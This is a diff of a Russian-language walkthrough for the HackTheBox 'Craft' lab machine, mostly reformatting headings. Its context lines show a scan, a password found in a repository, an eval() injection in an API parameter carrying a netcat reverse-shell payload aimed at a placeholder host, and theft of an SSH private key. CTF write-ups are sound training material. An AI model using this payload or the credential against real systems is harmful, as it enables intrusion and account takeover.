@@ -4,9 +4,9 @@
 | ----- | ---------- |
 | Craft | Medium     |
 
-### Own User
+## Own User
 
-##### Stage 1
+#### Stage 1
 
 Сканируем с помощью утилиты `nmap` 
 
@@ -20,7 +20,7 @@ nmap -sV -sC -T4 -p 1-10000 10.10.10.110
 6022/tcp open  ssh      (protocol 2.0)
 ```
 
-Переходим в браузере по ссылке https://10.10.10.110/ Пройдясь по сайту обнаруживаем поддомены. Для лучшей работы с машиной следует прописать поддомены в файле `nano /etc/hosts`: 
+Переходим в браузере по ссылке https://10.10.10.110/ Пройдясь по сайту обнаруживаем поддомены. Для лучшей работы с машиной следует прописать поддомены в файле `/etc/hosts`: 
 ```python
 10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
 ``` 
@@ -30,7 +30,7 @@ nmap -sV -sC -T4 -p 1-10000 10.10.10.110
 
 
 
-##### Stage 2
+#### Stage 2
 
 Перейдем на `https://gogs.craft.htb/`. Ресурс является оболочкой для `git` и чем-то напоминает `github`. Внимательно рассмотрим сорцы и коммиты. 
 
@@ -41,7 +41,7 @@ auth=('dinesh', '4aUh0A8PbVJxgd')
 
 
 
-##### Stage 3
+#### Stage 3
 
 На главное странице говорится о **REST**, а значит на сайте есть **API**: https://api.craft.htb/api/ 
 
@@ -81,13 +81,13 @@ check = session.get('https://api.craft.htb/api/auth/check', headers=headers, ver
 
 
 
-##### Stage 4
+#### Stage 4
 
 На странице **API**, имеется несколько других запросов. Один из них **POST**-запрос:
 
 <img src="https://raw.githubusercontent.com/axelmaker/ctf-writeups/master/HackTheBox/Craft/img/htb_craft_03.png" height="200">
 
-В файле `craft_api/api/brew/endpoints/brew.py`  на `git'e`  видно, что параметр `abv` обрабатывается с помощью функции `eval()` 
+В файле `craft_api/api/brew/endpoints/brew.py` параметр `abv` обрабатывается с помощью функции `eval()` 
 
 ```python
 if eval('%s > 1' % request.json['abv']):
@@ -137,7 +137,7 @@ abv = "__import__('os').system('nc IP_HOST 4444 -e /bin/sh')"
 
 
 
-##### Stage 5
+#### Stage 5
 
 Для лучшего отображения, воспользуемся библиотека языка `python` - **pty**, активировав в нем **shell**: 
 
@@ -197,7 +197,7 @@ python
 
 
 
-##### Stage 6
+#### Stage 6
 
 Попробуем авторизироваться с логином и паролем пользователей на https://gogs.craft.htb/. Расмотрев их профили, обнаруживаем у пользователя **gilfoyle** приватный репозиторий. В конце репозитория имеется папка `.ssh` (ай-яй-яй :) ). Вытаскиваем от туда приватный ключ и сохраняем в файл  **id_rsa_craft**.
 
